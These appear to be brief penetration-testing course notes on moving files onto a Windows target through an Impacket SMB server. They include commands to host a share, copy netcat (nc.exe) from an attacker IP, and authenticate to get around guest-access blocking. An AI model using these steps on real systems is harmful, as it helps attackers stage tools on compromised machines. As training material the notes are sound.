
create the smb server
```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

copy a file from an smb server
```
C:\htb> copy \\192.168.220.133\share\nc.exe
```

New versions of Windows block unauthenticated guest access

To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

mount the smb server using the authentication
```
C:\htb> net use n: \\192.168.220.133\share /user:test test
```


